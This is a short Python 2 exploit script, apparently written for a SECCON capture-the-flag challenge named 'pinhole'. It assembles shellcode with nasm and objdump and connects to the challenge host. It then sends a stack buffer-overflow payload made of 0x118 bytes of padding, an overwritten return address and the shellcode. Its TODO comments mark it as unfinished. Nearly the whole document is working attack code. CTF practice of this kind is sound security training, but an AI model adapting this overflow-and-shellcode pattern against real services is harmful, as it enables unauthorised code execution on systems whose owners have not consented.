#!/usr/bin/env python2

# TODO
# 1. compile binary and see assembly
# 2. make memmem rop & if statement

from socket import *
import commands
import struct
import os

#HOST = 'localhost'
HOST = 'pinhole.pwn.seccon.jp'

def p64(n):
    return struct.pack('<Q', n)

def up64(s):
    return struct.unpack('<Q', s)[0]

def build():
    os.system("nasm -felf64 read.S -o read.o")
    os.system("ld -s -o read read.o")
    sc = commands.getoutput("for i in $(objdump -D read |grep \"^ \" |cut -f2); do echo -n $i; done; echo")
    return sc.decode("hex")

if __name__ == '__main__':
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((HOST, 10000))
    f = s.makefile('rw', bufsize=0)


    sc = build()
    payload = "A"*0x118 + p64(0x48a76b) + sc
    payload = payload.ljust(0x200, "A")
    f.write(payload)
    print(repr(f.readline()))
    #print hex(up64(f.readline()[0:8]))


